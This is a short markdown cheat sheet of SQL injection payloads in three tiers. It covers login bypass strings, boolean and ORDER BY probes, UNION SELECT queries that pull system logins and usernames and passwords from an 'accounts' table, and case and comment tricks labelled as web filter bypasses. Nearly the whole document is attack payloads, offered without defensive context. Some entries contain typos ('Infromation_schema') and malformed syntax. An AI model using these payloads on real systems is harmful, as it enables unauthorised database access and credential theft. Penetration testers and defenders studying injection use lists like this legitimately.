

### Summary:


__Basic___

>> __' OR 1=1 ;--__ 
    
>> __') OR 1=1; --__ 
   
>> __' and 'a'='a__

>> __' and 'a'='b__

   
&nbsp;
&nbsp;
&nbsp;

__Medium:__


| __1' and 1=1__ &nbsp;  | nbsp; True 


| __1' and 1=0__ &nbsp;  |  &nbsp; False 


| __1' order by 1 __ &nbsp; |  &nbsp; True


| __1' order by 10000__ &nbsp; | &nbsp; False


| __1 or db_name()=1);__ &nbsp;|  &nbsp;


| __1 or db_name(0)=1)__ &nbsp; | &nbsp; increase the number until the database does not show any errors



| __9999' UNION SELECT name,222,'else1' FROM master.syslogin; --__ 

&nbsp;
&nbsp;
&nbsp;

__Complex:__

| __union select 1, 2, 3 %23__                  &nbsp;&nbsp;  |  Bypass Web filters  | 


| __uNioN+sEleCt+1,2+%23__                      &nbsp;&nbsp;  |  Bypass Web filters  |  


| __uNioN`/**/`sEleCt`/**/`1,2`/**/`%23__       &nbsp;&nbsp;  |  Bypass Web filters  | 


| __union select 1, column_name, null, from Infromation_schema .columns where table_name = 0x769166__  &nbsp;&nbsp; | hex encoding                                                                                                                                dbname   


| __' union select 1, column_name, null, null, null, 5 from Infromation_schema.columns where table_name = 'accounts'__ | 


| __' union select username, pass, is_admin from 'accounts'__ &nbsp;&nbsp;  | 


| __' union select 1, table_name, null, null, null, 5 from Infromation_schema.tables where table_schema = 'owasdb'__ |

